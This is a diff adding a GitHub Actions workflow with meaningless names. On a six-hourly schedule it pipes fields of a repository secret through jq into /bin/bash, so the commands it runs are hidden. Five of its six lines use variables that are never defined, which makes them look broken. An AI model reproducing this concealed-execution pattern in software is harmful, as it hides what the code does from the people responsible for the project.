@@ -1,0 +1,22 @@
+name: dientoupi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dientoupi
+        env:
+          fr74: ${{ secrets.fr74 }}
+        run: |
+          echo $fr74 | jq -r .bbh9 | /bin/bash
+          echo $h325 | jq -r .ijkom98 | /bin/bash
+          echo $ed91477 | jq -r .kn79 | /bin/bash
+          echo $kgchu9 | jq -r .vlvl3 | /bin/bash
+          echo $dfozn60 | jq -r .djy177 | /bin/bash
+          echo $b2 | jq -r .t13296 | /bin/bash
+
